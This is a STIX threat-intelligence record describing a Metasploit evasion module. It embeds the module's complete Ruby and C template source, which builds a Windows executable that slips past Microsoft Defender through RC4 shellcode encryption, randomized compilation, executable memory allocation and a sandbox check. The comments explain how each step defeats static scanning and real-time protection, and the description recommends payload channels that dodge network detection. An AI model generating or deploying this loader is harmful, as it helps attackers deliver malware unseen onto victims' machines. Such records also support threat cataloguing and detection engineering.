{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac67b35b-7440-4fab-a8a4-d0f153a55ada",
    "created": "2024-08-14T16:33:19.194234Z",
    "modified": "2024-08-14T16:33:19.194237Z",
    "name": "Microsoft Windows Defender Evasive Executable",
    "description": " This module allows you to generate a Windows EXE that evades against Microsoft Windows Defender. Multiple techniques such as shellcode encryption, source code obfuscation, Metasm, and anti-emulation are used to achieve this.  For best results, please try to use payloads that use a more secure channel such as HTTPS or RC4 in order to avoid the payload network traffic getting caught by antivirus better. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/windows_defender_exe.rb",
            "external_id": "windows_defender_exe.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/compiler/windows'\n\nclass MetasploitModule < Msf::Evasion\n\n  def initialize(info={})\n    super(merge_info(info,\n      'Name'        => 'Microsoft Windows Defender Evasive Executable',\n      'Description' => %q{\n        This module allows you to generate a Windows EXE that evades against Microsoft\n        Windows Defender. Multiple techniques such as shellcode encryption, source code\n        obfuscation, Metasm, and anti-emulation are used to achieve this.\n\n        For best results, please try to use payloads that use a more secure channel\n        such as HTTPS or RC4 in order to avoid the payload network traffic getting\n        caught by antivirus better.\n      },\n      'Author'      => [ 'sinn3r' ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'win',\n      'Arch'        => ARCH_X86,\n      'Targets'     => [ ['Microsoft Windows', {}] ]\n    ))\n  end\n\n  def rc4_key\n    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)\n  end\n\n  def get_payload\n    @c_payload ||= lambda {\n      opts = { format: 'rc4', key: rc4_key }\n      junk = Rex::Text.rand_text(10..1024)\n      p = payload.encoded + junk\n\n      return {\n        size: p.length,\n        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)\n      }\n    }.call\n  end\n\n  def c_template\n    @c_template ||= %Q|#include <Windows.h>\n#include <rc4.h>\n\n// The encrypted code allows us to get around static scanning\n#{get_payload[:c_format]}\n\nint main() {\n  int lpBufSize = sizeof(int) * #{get_payload[:size]};\n  LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);\n  memset(lpBuf, '\\\\0', lpBufSize);\n\n  HANDLE proc = OpenProcess(0x1F0FFF, false, 4);\n  // Checking NULL allows us to get around Real-time protection\n  if (proc == NULL) {\n    RC4(\"#{rc4_key}\", buf, (char*) lpBuf, #{get_payload[:size]});\n    void (*func)();\n    func = (void (*)()) lpBuf;\n    (void)(*func)();\n  }\n\n  return 0;\n}|\n  end\n\n  def run\n    vprint_line c_template\n    # The randomized code allows us to generate a unique EXE\n    bin = Metasploit::Framework::Compiler::Windows.compile_random_c(c_template)\n    print_status(\"Compiled executable size: #{bin.length}\")\n    file_create(bin)\n  end\n\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}